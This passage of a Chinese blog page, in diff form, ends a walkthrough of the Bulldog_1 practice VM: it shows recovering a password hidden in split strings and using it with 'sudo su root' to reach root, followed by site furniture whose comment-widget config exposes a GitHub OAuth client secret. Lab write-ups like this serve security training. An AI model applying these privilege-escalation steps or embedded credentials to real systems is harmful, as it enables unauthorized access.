me know what you thought on twitter, I&#x27;</span>m @frichette_n<br><br>As far as I know there are two ways to get root. Can you find the other one?<br><br>Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!<br><span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:07:ae:20 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.123/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe07:ae20/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux bulldog 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<h3 id="拆分组合隐藏的密码"><a href="#拆分组合隐藏的密码" class="headerlink" title="拆分组合隐藏的密码"></a>拆分组合隐藏的密码</h3><p>其实是自己对英文的敏感度不够，没有看出这里其实是把有意义的单词进行拆分组合。</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">SUPERultH</span><br><span class="hljs-attribute">imatePASH</span><br><span class="hljs-attribute">SWORDyouH</span><br><span class="hljs-attribute">CANTget</span><br></code></pre></td></tr></table></figure>
+
+<p>把 H 去掉，其他的连起来就是 <code>SUPERultimatePASSWORDyouCANTget</code>，翻译成中文就是超级中级密码，你不可能拿到。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ su -<br>su -                                                                                                                <br>Password: SUPERultimatePASSWORDyouCANTget                                                                           <br>                                                                                                                    <br>su: Authentication failure                                                                                          <br>django@bulldog:/home/django/bulldog$ sudo su root<br>sudo su root<br>[sudo] password <span class="hljs-keyword">for</span> django: SUPERultimatePASSWORDyouCANTget<br><br>root@bulldog:/home/django/bulldog<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@bulldog:/home/django/bulldog<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:07:ae:20 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.123/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe07:ae20/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@bulldog:/home/django/bulldog<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux bulldog 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Bulldog_1 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/57098f1aa06f.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/fc6d5535056b.html" title="「红队笔记」Linux提权精讲">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">「红队笔记」Linux提权精讲</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/3e56f363190c.html" title="TYPHOON_1_02 靶机">
+                        <span class="hidden-mobile">TYPHOON_1_02 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'e146a8cf40de09690adfa9f951936d08'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
